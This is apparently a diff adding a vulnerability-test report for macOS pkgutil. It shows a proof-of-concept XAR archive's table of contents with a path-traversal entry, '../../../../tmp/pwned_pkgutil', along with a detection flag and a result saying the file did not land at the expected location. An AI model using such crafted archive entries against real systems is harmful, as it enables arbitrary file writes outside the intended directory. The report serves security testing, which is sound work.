@@ -1,0 +1,40 @@
+Report: OE1104428478322
+Date: Wed Oct 28 12:02:41 UTC 2026
+
+--- System ---
+ProductName:		macOS
+ProductVersion:		26.6.2
+BuildVersion:		25G83
+arm64
+
+--- Tool ---
+/usr/sbin/pkgutil
+(no --version)
+
+--- poc.xar embedded filename ---
+=== XAR TOC ===
+<?xml version="1.0" encoding="UTF-8"?>
+<xar>
+ <toc>
+  <creation-time>2026-10-28T00:00:00</creation-time>
+  <checksum style="none"/>
+  <file id="1">
+   <name>../../../../tmp/pwned_pkgutil</name>
+   <type>file</type>
+   <data>
+    <offset>0</offset>
+    <size>42</size>
+    <length>42</length>
+    <encoding style="application/octet-stream"/>
+   </data>
+  </file>
+ </toc>
+</xar>
+
+=== Embedded filenames ===
+  '../../../../tmp/pwned_pkgutil'
+  ^^^ PATH TRAVERSAL SEQUENCE DETECTED
+
+--- Vulnerability check ---
+RESULT: path not at expected location
+/tmp
